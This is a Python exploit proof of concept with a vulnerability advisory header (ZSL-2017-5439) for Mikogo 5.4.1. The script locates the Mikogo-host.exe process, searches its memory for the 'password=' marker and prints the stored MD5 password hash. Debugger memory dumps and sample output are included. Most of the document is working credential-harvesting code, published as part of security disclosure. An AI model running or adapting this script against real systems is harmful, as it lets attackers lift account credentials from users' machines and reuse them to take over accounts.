#!/usr/bin/env python
#
#
# Mikogo 5.4.1.160608 Local Credentials Disclosure
#
#
# Vendor: Snapview GmbH
# Product web page: https://www.mikogo.com
# Affected version: 5.4.1.160608
#
# Summary: Mikogo is a desktop sharing software application for
# web conferencing and remote support, and is provided by the online
# collaboration provider, BeamYourScreen GmbH. Mikogo provides
# its software as native downloads for Windows, Mac OS X, Linux,
# iOS and Android.
#
# Desc: Mikogo is vulnerable to local credentials disclosure, the
# supplied password is stored as a MD5 hash format in memory process.
# A potential attacker could reveal the supplied password hash and
# re-use it or store it via the configuration file in order to gain
# access to the account.
#
# ------------------------------------------------------------------
#
# 0:017> s -a 0 L?80000000 "password="
# 0125cdad  70 61 73 73 77 6f 72 64-3d 00 00 26 6c 61 6e 67  password=..&lang
# 0146e6b8  70 61 73 73 77 6f 72 64-3d 00 00 00 64 6f 6d 61  password=...doma
# 06a422b3  70 61 73 73 77 6f 72 64-3d 34 42 33 42 38 37 34  password=482C811
# 0:017> da 06a422b3
# 06a422b3  "password=482C811DA5D5B4BC6D497FF"
# 06a422d3  "A98491E38...."
#
# ...
# ...
#
# C:\Users\Charlie\Desktop>python mikogo_mem.py
# [~] Searching for pid by process name 'Mikogo-host.exe'..
# [+] Found process with pid #1116
# [~] Trying to read memory for pid #1116
# [+] Credentials found!
# ----------------------------------------
# [+] MD5 Password: 482C811DA5D5B4BC6D497FFA98491E38
#
# ------------------------------------------------------------------
#
# Tested on: Microsoft Windows 7 Professional SP1 (EN)
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#                             @zeroscience
#
#
# Advisory ID: ZSL-2017-5439
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5439.php
#
#
# 03.07.2017
#
#
# Based on Yakir Wizman's PoC:
#


import time
import urllib
from winappdbg import Debug, Process

username    = ''
password    = ''
found       = 0
filename    = "Mikogo-host.exe"
process_pid = 0
memory_dump = []
 
debug = Debug()
try:
    print "[~] Searching for pid by process name '%s'.." % (filename)
    time.sleep(1)
    debug.system.scan_processes()
    for (process, process_name) in debug.system.find_processes_by_filename(filename):
        process_pid = process.get_pid()
    if process_pid is not 0:
        print "[+] Found process with pid #%d" % (process_pid)
        time.sleep(1)
        print "[~] Trying to read memory for pid #%d" % (process_pid)
         
        process = Process(process_pid)
        for address in process.search_bytes('\x0a\x70\x61\x73\x73\x77\x6f\x72\x64\x3d'):
            memory_dump.append(process.read(address,42))
        for i in range(len(memory_dump)):
            password = memory_dump[i].split('password=')[1]
            if password !='':
                found = 1
                print "[+] Credentials found!\r\n----------------------------------------"
                print "[+] MD5 Password: %s" % password
        if found == 0:
            print "[-] Credentials not found! Make sure the client is connected."
    else:
        print "[-] No process found with name '%s'." % (filename)
     
    debug.loop()
finally:
    debug.stop()